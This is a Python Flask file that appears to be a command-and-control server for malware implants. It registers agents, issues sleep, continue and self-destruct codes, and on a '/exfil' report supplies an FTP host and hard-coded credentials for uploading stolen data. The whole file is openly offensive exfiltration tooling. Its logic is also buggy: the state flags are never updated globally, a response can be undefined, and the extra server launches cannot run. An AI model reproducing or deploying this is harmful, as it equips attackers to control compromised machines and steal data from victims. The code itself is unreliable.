from flask import Flask, request, make_response, render_template

app = Flask(__name__)

# Dictionary to hold agent sessions
agents = {}

# Manually triggered post requests
data_found = False
kill_implants = False

# Manual commands sent by user
## Manually send post to initialize self-destruct
@app.route('/manual_kill', methods=['POST'])
def self_destruct():
    kill_implants = True
    response = make_response()
    response.headers['cmd'] = 2
    return response

## Manually send post to indicate that data is incorrect
@app.route('/manual_badData', methods=['POST'])
def cleared_data():
    data_found = False
    return make_response(1)


# Route to register a new agent session
@app.route('/register', methods=['POST'])
def register():
    agent_id = request.form['agent_id']
    command = request.form['command']
    agents[agent_id] = {'agent_id': agent_id,
                            'command' : command}
    response = make_response()
    response.headers['cmd'] = 1
    return response


# Route to receive commands from an agent
@app.route('/command', methods=['POST'])
def command():
    # Send a command to a session
    agent_id = request.form['agent_id']
    # Send the command to the agent associated with the session ID
    if agent_id in agents.keys():

        # Send the command to the agent here...
        # Can assign commands to numbers, i.e.,
        ## 0 - sleep
        ## 1 - continue
        ## 2 - self-destruct
        response = make_response()
        if data_found:
            response.headers['cmd'] = 0
            agents[agent_id]['command'] = 0
        elif kill_implants:
            response.headers['cmd'] = 2
            agents[agent_id]['command'] = 2
        else:
            response.headers['cmd'] = 1
            agents[agent_id]['command'] = 1
    
    return response

# Route to receive exfiltrated data from an agent
@app.route('/exfil', methods=['POST'])
def exfil():
    agent_id = request.form['agent_id']
    found = int(request.form['found'])
    response = make_response()
    if agent_id in agents:
        if found == 1:
            data_found = True
            response.headers['host'] = '192.168.68.128'
            response.headers['username'] = 'ftpwebuser'
            response.headers['password'] = 'password'
            response.headers['cmd'] = 0
            agents[agent_id]['command'] = 0
        else:
            response.headers['cmd'] = 0
            agents[agent_id]['command'] = 2
    else:
        response.headers['cmd'] = 1

    return response

if __name__ == '__main__':
    app.run(debug=True, host='192.168.68.128', port=8080)
    app.run(debug=True, host='0.0.0.0', port=20)
    app.run(debug=True, host='0.0.0.0', port=21)